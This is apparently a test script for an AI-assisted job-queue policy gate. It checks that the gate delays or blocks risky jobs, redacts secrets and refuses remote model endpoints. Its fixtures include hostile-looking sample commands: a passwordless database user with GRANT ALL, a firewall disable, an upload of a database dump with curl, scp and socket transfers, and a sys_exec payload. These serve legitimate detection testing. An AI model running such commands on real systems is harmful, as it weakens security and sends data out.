#!/usr/bin/env bash
set -euo pipefail
ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
TMP="$(mktemp -d)"
trap 'rm -rf "$TMP"' EXIT
qgate() { timeout 10 "$ROOT/bin/queue-ai-policy-gate" "$@"; }
mkdir -p "$TMP/root/pending" "$TMP/root/pol_blocked" "$TMP/root/logs"
cat > "$TMP/root/pending/job1.job" <<'JOB'
JOB_ID=job1
JOB_NAME=ordinary
JOB_CLASS=DEFAULT
PRIORITY=100
RUNNER=auto
SANDBOX_LEVEL=off
COMMAND=( echo hello )
JOB

# Disabled by default unless explicitly enabled/forced.
if QUEUEBASH_ROOT="$TMP/root" qgate scan --limit 1 >/tmp/ai-policy-disabled.out 2>/tmp/ai-policy-disabled.err; then
  echo "expected disabled scan to fail" >&2
  exit 1
fi
grep -q "disabled" /tmp/ai-policy-disabled.err
echo "stage: disabled-default ok"

# Weak/unsupported block requests must not become policy blocks.
QUEUEBASH_AI_POLICY_GATE_ENABLED=1 QUEUEBASH_ROOT="$TMP/root" \
  qgate scan --limit 1 \
  --fixture-decision-json "$ROOT/tests/fixtures/ai_policy_gate/weak_block_downgrade_decision.json" \
  > "$TMP/delay.json"
python3 - "$TMP/delay.json" <<'PY'
import json, sys
obj=json.load(open(sys.argv[1]))
assert obj["schema"] == "queuebash.ai_policy_gate.result.v1"
assert obj["results"][0]["action"] == "advise_delay"
PY
grep -q '^AI_POLICY_GATE_ADVISORY=' "$TMP/root/pending/job1.job"
grep -q '^NOT_BEFORE_EPOCH=' "$TMP/root/pending/job1.job"
[[ ! -f "$TMP/root/pol_blocked/job1.job" ]]
echo "stage: advisory-downgrade ok"

# A high-confidence but non-hostile ambiguous admin classification is still advisory only.
QUEUEBASH_AI_POLICY_GATE_ENABLED=1 QUEUEBASH_ROOT="$TMP/root" \
  qgate classify --job-file "$TMP/root/pending/job1.job" \
  --fixture-decision-json "$ROOT/tests/fixtures/ai_policy_gate/ambiguous_admin_block_decision.json" \
  > "$TMP/ambiguous.json"
python3 - "$TMP/ambiguous.json" <<'PY'
import json, sys
obj=json.load(open(sys.argv[1]))
assert obj["decision"] == "advise_delay", obj
PY

# A low-confidence unknown block request is allowed, not delayed or blocked.
QUEUEBASH_AI_POLICY_GATE_ENABLED=1 QUEUEBASH_ROOT="$TMP/root" \
  qgate classify --job-file "$TMP/root/pending/job1.job" \
  --fixture-decision-json "$ROOT/tests/fixtures/ai_policy_gate/low_confidence_unknown_decision.json" \
  > "$TMP/lowconf.json"
python3 - "$TMP/lowconf.json" <<'PY'
import json, sys
obj=json.load(open(sys.argv[1]))
assert obj["decision"] == "allow", obj
PY

# Per-job fixture directory avoids applying one hostile fixture to every job.
cat > "$TMP/root/pending/job2.job" <<'JOB'
JOB_ID=job2
JOB_NAME=hostile
JOB_CLASS=DEFAULT
PRIORITY=100
RUNNER=auto
SANDBOX_LEVEL=off
COMMAND=( bash -lc 'echo hostile fixture' )
JOB
QUEUEBASH_AI_POLICY_GATE_ENABLED=1 QUEUEBASH_ROOT="$TMP/root" \
  qgate scan --limit 2 \
  --fixture-decision-dir "$ROOT/tests/fixtures/ai_policy_gate/per_job" \
  > "$TMP/block.json"
[[ -f "$TMP/root/pol_blocked/job2.job" ]]
[[ -f "$TMP/root/pending/job1.job" ]]
grep -q '^POLICY_BLOCKED_BY=ai_policy_gate' "$TMP/root/pol_blocked/job2.job"
grep -q '"action":"pol_block"' "$TMP/root/logs/ai-policy-gate.audit.jsonl"

# Prompt/request generation redacts obvious inline secrets before model use.
cat > "$TMP/root/pending/job3.job" <<'JOB'
JOB_ID=job3
JOB_NAME=secret-redaction
JOB_CLASS=DEFAULT
PRIORITY=100
RUNNER=auto
SANDBOX_LEVEL=off
COMMAND=( curl -H 'Authorization: Bearer abcdefghijklmnopqrstuvwxyz' --password supersecret123 https://example.invalid )
JOB
QUEUEBASH_AI_POLICY_GATE_ENABLED=1 QUEUEBASH_ROOT="$TMP/root" \
  qgate classify --job-file "$TMP/root/pending/job3.job" \
  --fixture-decision-json "$ROOT/tests/fixtures/ai_policy_gate/allow_decision.json" \
  --request-json "$TMP/request.json" >/dev/null
! grep -q 'abcdefghijklmnopqrstuvwxyz' "$TMP/request.json"
! grep -q 'supersecret123' "$TMP/request.json"
grep -q '\[REDACTED' "$TMP/request.json"
echo "stage: redaction ok"

# Live mode must refuse non-loopback Ollama URLs before any network call.
if QUEUEBASH_AI_POLICY_GATE_ENABLED=1 QUEUEBASH_AI_POLICY_GATE_OLLAMA_URL='http://192.0.2.10:11434/api/generate' \
   QUEUEBASH_ROOT="$TMP/root" qgate classify --job-file "$TMP/root/pending/job3.job" \
   >/tmp/ai-policy-nonlocal.out 2>/tmp/ai-policy-nonlocal.err; then
  echo "expected non-loopback live endpoint to be refused" >&2
  exit 1
fi
grep -q 'refusing_non_loopback_ollama_url' /tmp/ai-policy-nonlocal.err
echo "stage: nonlocal-refusal ok"


# ITSM/ticket contract integration: warn-delay can request a ticket when explicitly enabled.
rm -f "$TMP/root/logs/itsm-events.jsonl"
QUEUEBASH_AI_POLICY_GATE_ENABLED=1 QUEUEBASH_ITSM_ENABLED=1 \
QUEUEBASH_ITSM_EVENTS='policy_blocked,advisory_high_risk_operation' \
QUEUEBASH_AI_POLICY_GATE_TICKET_ON_ADVISE_DELAY=1 QUEUEBASH_ROOT="$TMP/root" \
  qgate scan --limit 1 \
  --fixture-decision-json "$ROOT/tests/fixtures/ai_policy_gate/weak_block_downgrade_decision.json" \
  > "$TMP/itsm_delay.json"
python3 - "$TMP/root/logs/itsm-events.jsonl" "$TMP/itsm_delay.json" <<'PYDELAY'
import json, sys
lines=[json.loads(x) for x in open(sys.argv[1]) if x.strip()]
assert len(lines) == 1, lines
e=lines[0]
assert e["schema"] == "queuebash.reporter.itsm_event.v1"
assert e["event"] == "advisory_high_risk_operation"
assert e["ticket_requested"] is True
assert e["ticket_created"] is False
assert e["contract_only"] is True
assert "command_text" not in e
res=json.load(open(sys.argv[2]))
assert res["results"][0]["ticket_requested"] is True
assert res["results"][0]["ticket_event"] == "advisory_high_risk_operation"
PYDELAY
echo "stage: advisory-ticket ok"

# ITSM/ticket contract integration: pol_block requests a ticket by default when ITSM is enabled.
ITSM_ROOT="$TMP/itsm-root"
mkdir -p "$ITSM_ROOT/pending" "$ITSM_ROOT/pol_blocked" "$ITSM_ROOT/logs"
cat > "$ITSM_ROOT/pending/job4.job" <<'JOB'
JOB_ID=job4
JOB_NAME=ticketed-pol-block
JOB_CLASS=DEFAULT
PRIORITY=100
RUNNER=auto
SANDBOX_LEVEL=off
COMMAND=( bash -lc 'echo hostile ticket fixture' )
JOB
cat > "$ITSM_ROOT/pending/job5.job" <<'JOB'
JOB_ID=job5
JOB_NAME=ticketed-allow
JOB_CLASS=DEFAULT
PRIORITY=100
RUNNER=auto
SANDBOX_LEVEL=off
COMMAND=( echo allow )
JOB
mkdir -p "$TMP/itsm-fixtures"
cp "$ROOT/tests/fixtures/ai_policy_gate/pol_block_decision.json" "$TMP/itsm-fixtures/job4.json"
cp "$ROOT/tests/fixtures/ai_policy_gate/allow_decision.json" "$TMP/itsm-fixtures/job5.json"
QUEUEBASH_AI_POLICY_GATE_ENABLED=1 QUEUEBASH_ITSM_ENABLED=1 \
QUEUEBASH_ITSM_EVENTS='policy_blocked,advisory_high_risk_operation' \
QUEUEBASH_ROOT="$ITSM_ROOT" \
  qgate scan --limit 2 \
  --fixture-decision-dir "$TMP/itsm-fixtures" \
  > "$TMP/itsm_block.json"
python3 - "$ITSM_ROOT/logs/itsm-events.jsonl" "$TMP/itsm_block.json" <<'PYBLOCK'
import json, sys
lines=[json.loads(x) for x in open(sys.argv[1]) if x.strip()]
assert any(e["event"] == "policy_blocked" and e["ticket_requested"] is True and e["ticket_created"] is False for e in lines), lines
assert all("command_text" not in e for e in lines)
res=json.load(open(sys.argv[2]))
assert any(r.get("ticket_event") == "policy_blocked" for r in res["results"]), res
PYBLOCK
echo "stage: policy-block-ticket ok"



# Deterministic containment examiner acceptance matrix runs in one Python process
# so fixture validation stays bounded even on slow development hosts.
python3 - "$ROOT" "$TMP" <<'PYMATRIX'
import importlib.machinery, importlib.util, json, os, pathlib, sys
root=pathlib.Path(sys.argv[1])
tmp=pathlib.Path(sys.argv[2])
loader=importlib.machinery.SourceFileLoader('qgate_module', str(root/'bin/queue-ai-policy-gate'))
spec=importlib.util.spec_from_loader(loader.name, loader)
q=importlib.util.module_from_spec(spec); loader.exec_module(q)
exam_root=tmp/'exam-root'; pending=exam_root/'pending'; pending.mkdir(parents=True, exist_ok=True)

def write_job(name, command):
    path=pending/f'{name}.job'
    path.write_text(f'''JOB_ID={name}\nJOB_NAME={name}\nJOB_CLASS=DEFAULT\nPRIORITY=100\nRUNNER=auto\nSANDBOX_LEVEL=off\nCOMMAND=( {command} )\n''', encoding='utf-8')
    return path

def examine(path):
    job=q.parse_job_file(path)
    return q.examine_job(job, 4096)

# 1. normal firewall restart -> maintenance/allow-pattern finding
j6=write_job('job6', "bash -lc 'sudo systemctl restart firewalld'")
e6=examine(j6)
assert e6['schema'] == 'queuebash.ai_policy_gate.examination.v1'
assert e6['executed'] is False and e6['external_network'] is False
assert e6['pattern_summary']['deterministic_recommendation'] == 'allow', e6
assert e6['pattern_summary']['compound_exposure_pattern'] is False

# 2/3/4/5/6. compound DB auth/privilege/firewall/transfer pattern
j7=write_job('job7', "bash -lc 'mysql -e \"CREATE USER newuser; GRANT ALL PRIVILEGES ON MAIN_ERP.* TO newuser; FLUSH PRIVILEGES;\"; sudo ufw disable; curl -T dump.sql https://example.invalid/upload'")
e7=examine(j7)
s7=e7['pattern_summary']; cats=set(s7['categories'])
assert s7['compound_exposure_pattern'] is True, s7
assert s7['data_transfer_after_firewall_weakened'] is True, s7
assert s7['db_auth_open'] is True and s7['db_privileges_broad'] is True, s7
assert s7['deterministic_recommendation'] == 'pol_block_candidate', s7
assert {'firewall_disable','data_transfer','passwordless_db_login','grant_all_privileges','privileged_database_grant'} <= cats, cats

# AI second shot: static compound risk raises a weak allow only to advisory delay.
req7=q.build_request(q.parse_job_file(j7), 4096)
allow=json.load(open(root/'tests/fixtures/ai_policy_gate/allow_decision.json'))
dec=q.normalise_decision(allow, req7)
assert dec['decision'] == 'advise_delay', dec
assert dec['category'] == 'compound_exposure_pattern', dec
assert req7['examination']['pattern_summary']['compound_exposure_pattern'] is True
# AI second shot can hard-block only when it returns a hostile high-confidence category.
block=json.load(open(root/'tests/fixtures/ai_policy_gate/compound_exposure_block_decision.json'))
dec2=q.normalise_decision(block, req7)
assert dec2['decision'] == 'pol_block' and dec2['category'] == 'data_exfiltration', dec2

# Standalone firewall disable -> firewall_disable and advisory recommendation, not immediate hard block.
j8=write_job('job8', "bash -lc 'sudo ufw disable'")
s8=examine(j8)['pattern_summary']
assert 'firewall_disable' in s8['categories'], s8
assert s8['firewall_weakened'] is True
assert s8['deterministic_recommendation'] == 'advise_delay'

# PostgreSQL passwordless login role and broad ERP database grant.
j9=write_job('job9', "psql -c 'CREATE ROLE newuser WITH LOGIN; GRANT ALL PRIVILEGES ON DATABASE \"MAIN_ERP\" TO newuser;'")
s9=examine(j9)['pattern_summary']; cats9=set(s9['categories'])
assert {'passwordless_db_login','grant_all_privileges','privileged_database_grant'} <= cats9, cats9
assert s9['db_auth_open'] is True and s9['db_privileges_broad'] is True
usage=s9['command_data_usage']
assert 'authentication_weakening' in usage['data_operations'], usage
assert 'broad_database_privilege_change' in usage['data_operations'], usage

# 7. Python subprocess/socket/file-transfer patterns detected statically.
j10=write_job('job10', "python3 -c 'import subprocess, socket, requests; subprocess.run([\"scp\",\"dump.sql\",\"host:/tmp/\"]); socket.create_connection((\"127.0.0.1\", 9)); requests.post(\"http://127.0.0.1/upload\", data=b\"x\")'")
e10=examine(j10); ids10=set(e10['pattern_summary']['finding_ids']); cats10=set(e10['pattern_summary']['categories'])
assert {'python_import_subprocess','python_subprocess_execution','python_network_client'} <= ids10, ids10
assert 'data_transfer' in cats10, cats10
assert 'python_ast_and_regex_patterns' in e10['job_type_plan']['selected_checks']

# 8. no execution of shell/SQL/Python-looking payloads.
pwn=tmp/'should_not_exist'
j11=write_job('job11', f"bash -lc 'touch {pwn}; python3 -c \"open(\\\"{pwn}.py\\\",\\\"w\\\").write(\\\"bad\\\")\"; mysql -e \"SELECT sys_exec(\\\"touch {pwn}.sql\\\")\"'")
e11=examine(j11)
assert not pwn.exists() and not pathlib.Path(str(pwn)+'.py').exists() and not pathlib.Path(str(pwn)+'.sql').exists()
assert e11['executed'] is False and e11['external_network'] is False
assert e11['job_type_plan']['schema'] == 'queuebash.ai_policy_gate.examination_plan.v1'

# 11. legal/case restriction hints are deterministic evidence and advisory by default.
hints=tmp/'legal_case_hints.tsv'
hints.write_text('''phrase	legal_hold_custom	high	LEGAL HOLD
''', encoding='utf-8')
j12=write_job('job12', "psql -c 'SELECT * FROM MAIN_ERP.case_restrictions WHERE note = \"LEGAL HOLD\";'" )
old_env=os.environ.get('QUEUEBASH_AI_POLICY_GATE_LEGAL_CASE_HINTS_FILE')
os.environ['QUEUEBASH_AI_POLICY_GATE_LEGAL_CASE_HINTS_FILE']=str(hints)
try:
    e12=examine(j12)
    s12=e12['pattern_summary']; cats12=set(s12['categories'])
    assert 'legal_case_restriction_hint' in cats12, cats12
    assert 'legal_case_database_entry_hint' in cats12, cats12
    assert s12['legal_case_restriction_present'] is True, s12
    assert 'legal_or_case_restriction_hint' in s12['command_data_usage']['data_operations'], s12
    req12=q.build_request(q.parse_job_file(j12), 4096)
    dec12=q.normalise_decision(json.load(open(root/'tests/fixtures/ai_policy_gate/allow_decision.json')), req12)
    assert dec12['decision'] == 'advise_delay' and dec12['category'] == 'legal_case_restriction_hint', dec12
    legal_block=json.load(open(root/'tests/fixtures/ai_policy_gate/legal_case_block_decision.json'))
    dec12b=q.normalise_decision(legal_block, req12)
    assert dec12b['decision'] == 'pol_block' and dec12b['category'] == 'case_restriction_violation', dec12b
finally:
    if old_env is None:
        os.environ.pop('QUEUEBASH_AI_POLICY_GATE_LEGAL_CASE_HINTS_FILE', None)
    else:
        os.environ['QUEUEBASH_AI_POLICY_GATE_LEGAL_CASE_HINTS_FILE']=old_env

print('ai_policy_gate_examination_matrix: ok')
PYMATRIX
echo "ai_policy_gate_fixture_smoke: ok"

# Legal/case restriction hints apply deterministically while raw hint values are redacted from model-facing request text/findings.
LEGAL_ROOT="$TMP/legal_root"
mkdir -p "$LEGAL_ROOT/pending" "$LEGAL_ROOT/logs" "$TMP/legal_policy"
cat > "$TMP/legal_policy/restriction_hints.tsv" <<'HINTS'
phrase	custom_restricted_phrase	critical	ACME_RESTRICTED_CASE_42
database_entry	custom_restricted_table	high	acme_restricted_cases
HINTS
cat > "$LEGAL_ROOT/pending/legal1.job" <<'JOB'
JOB_ID=legal1
JOB_NAME=legal_hint_check
JOB_CLASS=DEFAULT
PRIORITY=100
RUNNER=auto
SANDBOX_LEVEL=off
COMMAND=( psql -c 'select * from acme_restricted_cases where note = "ACME_RESTRICTED_CASE_42";' )
JOB
QUEUEBASH_AI_POLICY_GATE_ENABLED=1 QUEUEBASH_ROOT="$LEGAL_ROOT" \
QUEUEBASH_AI_POLICY_GATE_LEGAL_CASE_HINTS_FILE="$TMP/legal_policy/restriction_hints.tsv" \
  qgate classify --job-file "$LEGAL_ROOT/pending/legal1.job" \
  --fixture-decision-json "$ROOT/tests/fixtures/ai_policy_gate/allow_decision.json" \
  --request-json "$TMP/legal_request.json" \
  > "$TMP/legal_decision.json"
python3 - "$TMP/legal_request.json" "$TMP/legal_decision.json" <<'PY'
import json, sys
req=json.load(open(sys.argv[1]))
dec=json.load(open(sys.argv[2]))
assert dec["decision"] == "advise_delay", dec
assert dec["category"] == "legal_case_restriction_hint", dec
text=req["job"]["command_text"]
assert "ACME_RESTRICTED_CASE_42" not in text, text
assert "acme_restricted_cases" not in text.lower(), text
assert "[LEGAL_CASE_HINT:custom_restricted_phrase]" in text, text
summary=req["examination"]["pattern_summary"]["legal_case_hint_summary"]
assert summary["present"] is True, summary
assert "custom_restricted_phrase" in summary["hint_ids"], summary
assert "custom_restricted_table" in summary["hint_ids"], summary
findings=req["examination"]["findings"]
assert any(f.get("hint_id") == "custom_restricted_phrase" for f in findings), findings
assert any(f.get("hint_id") == "custom_restricted_table" for f in findings), findings
blob=json.dumps(findings, sort_keys=True)
assert "ACME_RESTRICTED_CASE_42" not in blob, blob
assert "acme_restricted_cases" not in blob.lower(), blob
PY
echo "stage: legal-hint-redaction-and-application ok"
